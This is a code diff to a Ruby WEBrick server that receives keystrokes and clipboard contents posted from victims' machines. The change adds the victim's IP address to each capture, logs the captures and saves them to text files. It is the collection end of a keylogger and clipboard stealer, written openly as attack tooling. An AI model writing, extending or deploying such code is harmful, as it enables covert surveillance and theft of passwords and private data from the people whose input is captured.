@@ -17,9 +17,6 @@ require 'webrick'
 require 'json'
 require 'logger'
 
-print "Do you want to display the captured clipboard data in the logs? (y/N): " # If the user didn't allow it, the captured clipboard will still be saved to saved_captures.txt by default
-show_clipboard_in_logs = gets.chomp.downcase == 'yes'
-
 class MyServlet < WEBrick::HTTPServlet::AbstractServlet
   # Initialize the servlet with a logger and file path
   def initialize(server, keystrokes_file_path, clipboard_file_path)
@@ -37,15 +34,18 @@ class MyServlet < WEBrick::HTTPServlet::AbstractServlet
       data = JSON.parse(post_data)
       keyboard_data = data['keyboardData'] || ''
       clipboard_data = data['clipboardData'] || ''
+
+      victim_ip = request.peeraddr.last # Retrive the IP Address of the victim as Identifier
       
-      @logger.info("Received Keystrokes: #{keyboard_data}") # Log received keystrokes
+      @logger.info("Received Keystrokes from  #{victim_ip}: #{keyboard_data}") # Log received keystrokes
 
       if @show_clipboard_in_logs
-         @logger.info("Received Clipboard Data: #{clipboard_data}") # Log received clipboard data
+         @logger.info("Received Clipboard Data from #{victim_ip}: #{clipboard_data}") # Log received clipboard data
       end
-      
-      save_to_file(@keystrokes_file_path, keyboard_data)
-      save_to_file(@clipboard_file_path, clipboard_data)
+
+      # Save the captures to the txt file
+      save_to_file(@keystrokes_file_path, "#{victim_ip}: #{keyboard_data}")
+      save_to_file(@clipboard_file_path, "#{victim_ip}: #{clipboard_data}")
       
       response.status = 200
       response.content_type = 'application/json'
@@ -77,6 +77,10 @@ clipboard_file_path = 'saved_clipboard.txt' # File to save captured clipboard da
 
 logger = Logger.new(STDERR)
 logger.level = Logger::INFO
+
+# If the user didn't allow it, the captured clipboard will still be saved to saved_captures.txt by default
+print "Do you want to display the captured clipboard data in the logs? (y/N): " 
+show_clipboard_in_logs = gets.chomp.downcase == 'yes'
 
 # Create and start the WEBrick server
 server = WEBrick::HTTPServer.new :Port => port, :Logger => logger, :AccessLog => []
